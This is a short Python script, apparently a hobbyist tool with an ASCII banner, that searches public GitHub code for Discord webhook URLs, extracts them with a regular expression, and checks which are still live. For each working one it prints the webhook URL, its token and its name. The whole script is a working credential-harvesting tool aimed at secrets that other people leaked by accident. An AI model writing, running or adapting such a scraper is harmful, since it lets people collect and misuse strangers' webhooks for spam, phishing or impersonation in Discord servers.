import requests,re,textwrap, github
from github import Github


ACCESS_TOKEN = 'YOUR GITHUB API KEY'
client = Github(ACCESS_TOKEN)

print('''
     _ _ _ _____ _____ _____ _____ _____ _____ _____ _____ 
    | | | |   __| __  |   __|     | __  |  _  |  _  |   __|
    | | | |   __| __ -|__   |   --|    -|     |   __|   __|
    |_____|_____|_____|_____|_____|__|__|__|__|__|  |_____|
                        Made by Von#0593                             
''')


#grabbing dat code
results = []
print('[!] Scraping Webhooks!')
search = client.search_code('in:file discord.com/api/webhooks/', sort='indexed', order='desc', highlight=True)
try:

    for file in search:
        get = requests.get(file.download_url).text
        pattern = re.compile(r'https://discord.com/api/webhooks/\d{18}/[^\n]*')
        data = re.findall(pattern, get)
        results.extend(data)

except github.RateLimitExceededException:
    print('[!] Rate limited!')
    print('')



#Valid checker
for item in results:
    webhook = textwrap.shorten(item, width=120, fix_sentence_endings=True, break_long_words=True, break_on_hyphens=False, placeholder='')
    try:
        requests.get(webhook).json()['id']
    except:
        print('Invalid')
        print('')
    else:
        response = requests.get(webhook).json()
        print('Webhook_URL:'+webhook)
        print('Token:', response['token'])
        print('Name:'+ response['name'])
        print('')
